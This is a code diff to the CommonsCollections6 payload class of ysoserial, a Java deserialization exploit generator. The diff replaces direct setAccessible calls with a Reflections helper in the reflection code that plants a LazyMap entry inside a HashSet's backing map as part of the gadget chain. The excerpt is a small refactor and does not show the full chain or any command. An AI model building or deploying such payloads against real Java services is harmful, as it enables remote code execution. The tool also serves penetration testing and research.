@@ -9,6 +9,7 @@ import org.apache.commons.collections.map.LazyMap;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.PayloadRunner;
+import ysoserial.payloads.util.Reflections;
 
 import java.io.Serializable;
 import java.lang.reflect.Field;
@@ -137,7 +138,7 @@ public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<
             f = HashSet.class.getDeclaredField("backingMap");
         }
 
-        f.setAccessible(true);
+        Reflections.setAccessible(f);
         HashMap innimpl = (HashMap) f.get(map);
 
         Field f2 = null;
@@ -147,8 +148,7 @@ public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<
             f2 = HashMap.class.getDeclaredField("elementData");
         }
 
-
-        f2.setAccessible(true);
+        Reflections.setAccessible(f2);
         Object[] array = (Object[]) f2.get(innimpl);
 
         Object node = array[0];
@@ -163,7 +163,7 @@ public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<
             keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
         }
 
-        keyField.setAccessible(true);
+        Reflections.setAccessible(keyField);
         keyField.set(node, entry);
 
         return map;
